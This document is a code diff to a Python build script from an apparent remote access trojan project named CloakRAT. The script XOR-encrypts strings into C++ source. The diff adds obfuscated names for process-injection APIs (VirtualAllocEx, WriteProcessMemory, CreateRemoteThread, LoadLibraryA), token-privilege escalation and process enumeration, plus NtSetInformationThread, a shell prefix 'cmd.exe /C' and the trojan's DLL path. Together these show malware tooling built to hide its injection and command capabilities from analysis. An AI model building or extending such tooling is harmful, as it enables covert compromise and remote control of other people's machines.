@@ -10,9 +10,32 @@ HEADER_XOR_CIPHER_VARIABLE_NAME = 'BUILD_TIME_CIPHER_BYTE'
 
 # Add or modify strings here.
 strings_to_encrypt = {
+    # general strings
     'str_ip': '127.0.0.1',
     'str_cmd': 'cmd.exe /C',
-    'str_dllPath': '.....................',
+    'str_dllPath': 'C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\x64\\Release\\CloakRAT.dll',
+    
+    # function names
+    'str_NtSetInformationThread': 'NtSetInformationThread',
+    'str_GetCurrentThread': 'GetCurrentThread',
+    'str_Sleep': 'Sleep',
+    'str_OpenProcess': 'OpenProcess',
+    'str_VirtualAllocEx': 'VirtualAllocEx',
+    'str_WriteProcessMemory': 'WriteProcessMemory',
+    'str_LoadLibraryA': 'LoadLibraryA',
+    'str_CreateRemoteThread': 'CreateRemoteThread',
+    'str_CloseHandle': 'CloseHandle',
+    'str_LookupPrivilegeValueA': 'LookupPrivilegeValueA',
+    'str_GetLastError': 'GetLastError',
+    'str_AdjustTokenPrivileges': 'AdjustTokenPrivileges',
+    'str_OpenProcessToken': 'OpenProcessToken',
+    'str_GetCurrentProcess': 'GetCurrentProcess',
+    'str_CreateToolhelp32Snapshot': 'CreateToolhelp32Snapshot',
+    'str_Process32First': 'Process32First',
+    'str_Process32Next': 'Process32Next',
+    
+    
+    # DLLs
     'str_kernel32': 'kernel32.dll',
 }
 
@@ -67,7 +90,7 @@ def main():
             encrypted_string_lst = xor_encrypt(string, key, byte_chiper)
             encrypted_c_arr = to_c_array(var_name, encrypted_string_lst)
             source_file.write(encrypted_c_arr + '\n')  # Write the encrypted string array
-            source_file.write(f'size_t {var_name}_len = sizeof({var_name});\n')  # Write the length of the array
+            source_file.write(f'size_t {var_name}_len = sizeof({var_name});\n\n')  # Write the length of the array
     
     # Generate the Header file
     with open(f'{DIR}/{HEADER_NAME}', 'w') as header_file:
@@ -77,12 +100,12 @@ def main():
         header_file.write('#pragma once\n\n')
         header_file.write('#include <array>\n\n')
         header_file.write(f'#define {HEADER_XOR_CIPHER_VARIABLE_NAME} {c_style_byte_cipher}\n')
-        header_file.write(f'std::array<uint8_t, {KEY_ENTROPY}> {HEADER_XOR_KEY_VARIABLE_NAME} = {{ {', '.join(str(b) for b in key)} }};\n\n')
+        header_file.write(f'static std::array<uint8_t, {KEY_ENTROPY}> {HEADER_XOR_KEY_VARIABLE_NAME} = {{ {', '.join(str(b) for b in key)} }};\n\n')
         
         for var_name in strings_to_encrypt.keys():
             extern_decl = to_extern_decl(var_name)
             header_file.write(extern_decl + '\n')
-            header_file.write(f'extern size_t {var_name}_len;\n')
+            header_file.write(f'extern size_t {var_name}_len;\n\n')
 
 if __name__ == '__main__':
         main()
